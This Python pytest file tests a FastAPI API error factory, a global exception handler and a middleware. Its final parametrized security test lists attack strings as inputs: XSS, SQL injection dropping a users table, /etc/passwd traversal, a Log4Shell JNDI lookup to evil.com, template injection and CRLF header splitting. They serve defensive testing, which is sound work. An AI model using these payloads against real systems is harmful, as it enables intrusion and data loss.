"""Unit tests for API error handling following TEST_BUILDING.md ZERO TOLERANCE standards.

MANDATORY REQUIREMENTS (NON-NEGOTIABLE):
- NO vestigial code - every line serves a purpose
- NO legacy patterns - modern Python 3.11+ only
- NO backwards compatibility - clean implementations only
- NO broad exceptions - specific exceptions required
- SOLID principles compliance mandatory
- DRY compliance mandatory - no duplication
- Production-ready implementations only
- AAA pattern (Arrange-Act-Assert) for ALL tests
- Security tests for ALL input handlers
- Performance benchmarks for ALL critical paths

Tests API error factory and global exception handling with comprehensive coverage.
"""

import time
from collections.abc import Awaitable, Callable, MutableMapping
from typing import Any
from unittest.mock import Mock, patch

import pytest
from fastapi import HTTPException, status
from sqlalchemy.exc import IntegrityError, OperationalError

from src.api.errors import (
    APIErrorFactory,
    UnifiedExceptionMiddleware,
    create_global_exception_handler,
)
from src.core.exceptions import (
    APIBusinessLogicError,
    APIDatabaseError,
    APINotFoundError,
    APIValidationError,
    AuthenticationError,
    AuthorizationError,
    RateLimitError,
    ServiceUnavailableError,
)


class TestAPIErrorFactory:
    """Unit tests for APIErrorFactory following MANDATORY AAA pattern."""

    @pytest.mark.unit
    def test_not_found_creates_correct_error(self) -> None:
        """Test not_found creates properly structured 404 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        resource = "Job"
        identifier = "test-job-123"

        # Act - MANDATORY
        result = APIErrorFactory.not_found(resource, identifier)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_404_NOT_FOUND
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert resource in result.detail["message"]
        assert str(identifier) in result.detail["message"]
        assert "error_code" in result.detail
        assert "timestamp" in result.detail

    @pytest.mark.unit
    def test_database_error_creates_correct_error(self) -> None:
        """Test database_error creates properly structured 500 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        operation = "create batch"
        # SQLAlchemy OperationalError requires statement, params, orig (BaseException), and hide_parameters
        base_exc = Exception("Connection failed")
        original_error = OperationalError("Connection failed", None, base_exc, False)

        # Act - MANDATORY
        result = APIErrorFactory.database_error(operation, original_error)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert operation in result.detail["message"]
        assert "error_code" in result.detail

    @pytest.mark.unit
    def test_validation_error_with_field_and_details(self) -> None:
        """Test validation_error with field and details - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Invalid input"
        field = "email"
        details = {"pattern": "^[a-z]+@[a-z]+\\.[a-z]+$"}

        # Act - MANDATORY
        result = APIErrorFactory.validation_error(message, field, details)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]
        assert "details" in result.detail
        assert isinstance(result.detail["details"], dict)
        assert result.detail["details"]["field"] == field
        assert "pattern" in result.detail["details"]

    @pytest.mark.unit
    def test_business_logic_error_creates_correct_error(self) -> None:
        """Test business_logic_error creates proper 422 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Cannot delete job in progress"
        error_code = "JOB_IN_PROGRESS"

        # Act - MANDATORY
        result = APIErrorFactory.business_logic_error(message, error_code)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_400_BAD_REQUEST
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]
        assert result.detail["error_code"] == error_code

    @pytest.mark.unit
    def test_internal_server_error_hides_details(self) -> None:
        """Test internal_server_error doesn't expose sensitive info - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        sensitive_message = "Database password is invalid"
        original_error = Exception(sensitive_message)

        # Act - MANDATORY
        result = APIErrorFactory.internal_server_error("Internal server error", original_error)

        # Assert - MANDATORY (security check)
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        # MANDATORY: Sensitive details should not be in message
        assert sensitive_message not in result.detail["message"]
        assert "Internal server error" in result.detail["message"]

    @pytest.mark.unit
    def test_unauthorized_creates_401_error(self) -> None:
        """Test unauthorized creates proper 401 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Token expired"

        # Act - MANDATORY
        result = APIErrorFactory.unauthorized(message)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_401_UNAUTHORIZED
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]

    @pytest.mark.unit
    def test_forbidden_creates_403_error(self) -> None:
        """Test forbidden creates proper 403 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Insufficient permissions"

        # Act - MANDATORY
        result = APIErrorFactory.forbidden(message)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_403_FORBIDDEN
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]

    @pytest.mark.unit
    def test_rate_limit_exceeded_creates_429_error(self) -> None:
        """Test rate_limit_exceeded creates proper 429 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Too many requests"

        # Act - MANDATORY
        result = APIErrorFactory.rate_limit_exceeded(message)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_429_TOO_MANY_REQUESTS
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]

    @pytest.mark.unit
    def test_service_unavailable_creates_503_error(self) -> None:
        """Test service_unavailable creates proper 503 error - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        message = "Database maintenance in progress"
        details = {"retry_after": 300}

        # Act - MANDATORY
        result = APIErrorFactory.service_unavailable(message, details)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_503_SERVICE_UNAVAILABLE
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert message in result.detail["message"]

    @pytest.mark.unit
    def test_from_sqlalchemy_error_integrity_error(self) -> None:
        """Test from_sqlalchemy_error handles IntegrityError - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        operation = "create user"
        # SQLAlchemy IntegrityError requires statement, params, orig (BaseException), and hide_parameters
        base_exc = Exception("UNIQUE constraint failed")
        sql_error = IntegrityError("UNIQUE constraint failed", None, base_exc, False)

        # Act - MANDATORY
        result = APIErrorFactory.from_sqlalchemy_error(operation, sql_error)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
        assert isinstance(result.detail, dict)
        assert "message" in result.detail

    @pytest.mark.unit
    def test_from_sqlalchemy_error_operational_error(self) -> None:
        """Test from_sqlalchemy_error handles OperationalError - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        operation = "fetch jobs"
        # SQLAlchemy OperationalError requires statement, params, orig (BaseException), and hide_parameters
        base_exc = Exception("Connection timeout")
        sql_error = OperationalError("Connection timeout", None, base_exc, False)

        # Act - MANDATORY
        result = APIErrorFactory.from_sqlalchemy_error(operation, sql_error)

        # Assert - MANDATORY
        assert isinstance(result, HTTPException)
        assert result.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
        assert isinstance(result.detail, dict)
        assert "message" in result.detail

    @pytest.mark.unit
    def test_from_application_error_handles_all_types(self) -> None:
        """Test from_application_error handles all error types - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        error_types = [
            (APINotFoundError("User", 123), status.HTTP_404_NOT_FOUND),
            (APIValidationError("Invalid data", "field"), status.HTTP_422_UNPROCESSABLE_ENTITY),
            (AuthenticationError("Invalid token"), status.HTTP_401_UNAUTHORIZED),
            (AuthorizationError("No access"), status.HTTP_403_FORBIDDEN),
            (RateLimitError("Too many requests"), status.HTTP_429_TOO_MANY_REQUESTS),
            (
                ServiceUnavailableError("Maintenance"),
                status.HTTP_503_SERVICE_UNAVAILABLE,
            ),
        ]

        for app_error, expected_status in error_types:
            # Act - MANDATORY
            result = APIErrorFactory.from_application_error(app_error)

            # Assert - MANDATORY
            assert isinstance(result, HTTPException)
            assert result.status_code == expected_status
            assert isinstance(result.detail, dict)
            assert "message" in result.detail
            assert "error_code" in result.detail
            assert "timestamp" in result.detail

    @pytest.mark.unit
    @pytest.mark.security
    def test_error_detail_structure_is_consistent(self) -> None:
        """MANDATORY security test - error details have consistent structure."""
        # Arrange - MANDATORY
        sensitive_data = "password=secret123&token=abc-def-ghi"
        error = APIBusinessLogicError(f"Failed with {sensitive_data}", "BUSINESS_ERROR")

        # Act - MANDATORY
        result = APIErrorFactory.from_application_error(error)

        # Assert - MANDATORY (security check)
        assert isinstance(result, HTTPException)
        assert result.detail is not None
        assert isinstance(result.detail, dict)
        assert "message" in result.detail
        assert "error_code" in result.detail
        assert "timestamp" in result.detail

    @pytest.mark.unit
    @pytest.mark.security
    def test_debug_mode_disabled_hides_traceback(self) -> None:
        """MANDATORY security test - debug mode off hides tracebacks."""
        # Arrange - MANDATORY
        with patch.object(APIErrorFactory, "_debug_mode", False):
            original_error = ValueError("Sensitive internal error")
            error = APIDatabaseError("operation", original_error)

            # Act - MANDATORY
            result = APIErrorFactory.from_application_error(error)

            # Assert - MANDATORY (security check)
            assert isinstance(result.detail, dict)
            assert "debug" not in result.detail
            assert "traceback" not in str(result.detail).lower()

    @pytest.mark.unit
    @pytest.mark.performance
    def test_error_creation_performance(self) -> None:
        """MANDATORY performance test - error creation completes quickly."""
        # Arrange - MANDATORY
        iterations = 1000
        start_time = time.perf_counter()

        # Act - MANDATORY
        for i in range(iterations):
            APIErrorFactory.not_found("Resource", i)

        end_time = time.perf_counter()
        execution_time = end_time - start_time

        # Assert - MANDATORY (performance requirement)
        avg_time = execution_time / iterations
        assert avg_time < 0.001  # Less than 1ms per error creation
        assert execution_time < 1.0  # Total under 1 second for 1000 errors


class TestGlobalExceptionHandler:
    """Unit tests for global exception handler following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_global_handler_handles_application_errors(self) -> None:
        """Test global handler processes application errors - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        handler: Callable[[Any, Exception], Any] = create_global_exception_handler()
        mock_request: Mock = Mock()
        mock_request.url.path = "/api/test"
        mock_request.method = "GET"
        test_error = APINotFoundError("Test", 123)

        # Act - MANDATORY
        response = await handler(mock_request, test_error)

        # Assert - MANDATORY
        assert response.status_code == status.HTTP_404_NOT_FOUND
        assert "message" in response.body.decode()

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_global_handler_handles_unexpected_errors(self) -> None:
        """Test global handler handles unexpected exceptions - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        handler: Callable[[Any, Exception], Any] = create_global_exception_handler()
        mock_request: Mock = Mock()
        mock_request.url.path = "/api/test"
        mock_request.method = "POST"
        unexpected_error = RuntimeError("Unexpected failure")

        # Act - MANDATORY
        response = await handler(mock_request, unexpected_error)

        # Assert - MANDATORY
        assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
        assert "message" in response.body.decode()


class TestUnifiedExceptionMiddleware:
    """Unit tests for exception middleware following MANDATORY AAA pattern."""

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_middleware_handles_http_scope(self) -> None:
        """Test middleware handles HTTP scope correctly - MANDATORY AAA pattern."""

        # Arrange - MANDATORY
        async def normal_app(
            scope: MutableMapping[str, Any],
            receive: Callable[[], Awaitable[MutableMapping[str, Any]]],
            send: Callable[[MutableMapping[str, Any]], Awaitable[None]],
        ) -> None:
            # Normal app that doesn't raise errors
            pass

        middleware = UnifiedExceptionMiddleware(normal_app)
        scope: MutableMapping[str, Any] = {"type": "http"}
        receive: Mock = Mock()
        send: Mock = Mock()

        # Act - MANDATORY
        await middleware(scope, receive, send)

        # Assert - MANDATORY
        # Middleware should pass through without error
        assert scope["type"] == "http"

    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_middleware_ignores_non_http_requests(self) -> None:
        """Test middleware skips non-HTTP requests - MANDATORY AAA pattern."""

        # Arrange - MANDATORY
        async def passthrough_app(
            scope: MutableMapping[str, Any],
            receive: Callable[[], Awaitable[MutableMapping[str, Any]]],
            send: Callable[[MutableMapping[str, Any]], Awaitable[None]],
        ) -> None:
            return None

        middleware = UnifiedExceptionMiddleware(passthrough_app)
        scope: MutableMapping[str, Any] = {"type": "websocket"}
        receive: Mock = Mock()
        send: Mock = Mock()

        # Act - MANDATORY
        await middleware(scope, receive, send)

        # Assert - MANDATORY
        # Should pass through without error handling
        assert scope["type"] == "websocket"


# MANDATORY: Security payload testing for error messages
@pytest.mark.security
@pytest.mark.parametrize(
    "malicious_input",
    [
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",  # Template injection
        "%0d%0aSet-Cookie: malicious=true",  # HTTP response splitting
    ],
)
def test_error_messages_handle_malicious_input_safely(malicious_input: str) -> None:
    """MANDATORY security test - error messages handle malicious inputs safely."""
    # Arrange - MANDATORY
    # Try to inject malicious content through error messages

    # Act - MANDATORY
    result = APIErrorFactory.validation_error(malicious_input, "test_field")

    # Assert - MANDATORY (security check)
    assert isinstance(result, HTTPException)
    # MANDATORY: Error should be created without crashing
    assert result.detail is not None
    assert isinstance(result.detail, dict)
    assert "message" in result.detail
    assert "error_code" in result.detail
    # MANDATORY: Timestamp should be present
    assert "timestamp" in result.detail
